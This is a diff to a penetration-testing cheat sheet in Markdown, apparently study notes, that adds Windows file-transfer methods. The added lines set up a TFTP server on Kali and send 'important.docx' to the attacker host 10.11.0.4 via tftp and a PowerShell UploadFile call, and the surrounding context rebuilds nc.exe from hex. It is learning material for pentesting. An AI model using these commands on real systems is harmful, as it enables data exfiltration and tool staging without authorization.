@@ -15,6 +15,18 @@
     python -m SimpleHTTPServer [PORT] 
   ```
 ### Windows
+- TFTP
+  - Kali installation
+  ```bash
+  xonork@kali:~$ sudo apt update && sudo apt install atftp
+  xonork@kali:~$ sudo mkdir /tftp
+  xonork@kali:~$ sudo chown nobody: /tftp
+  xonork@kali:~$ sudo atftpd --daemon --port 69 /tftp
+  ```
+  - Tranfer binary in Windows (-i flag for binary tranfers)
+  ```bash
+  C:\Users\xonork> tftp -i 10.11.0.4 put important.docx
+  ```
 - FTP
   - Non-Interactive FTP Download
     ```bash
@@ -100,6 +112,10 @@
     #In Windows
     C:\Users\offsec>powershell -Command "$h=Get-Content -readcount 0 -path './nc.hex';$l=$h[0].length;$b=New-Object byte[] ($l/2);$x=0;for ($i=0;$i -le $l-1;$i+=2){$b[$x]=[byte]::Parse($h[0].Substring($i,2),[System.Globalization.NumberStyles]::HexNumber);$x+=1};set-content -encoding byte 'nc.exe' -value $b;Remove-Item -force nc.hex;"
     ```
+  - Upload file in Powershell
+  ```bash
+  powershell (New-Object System.Net.WebClient).UploadFile('http://10.11.0.4/upload.php', 'important.docx')
+  ```
     
 ## **Linux Privilege Escalation**
 
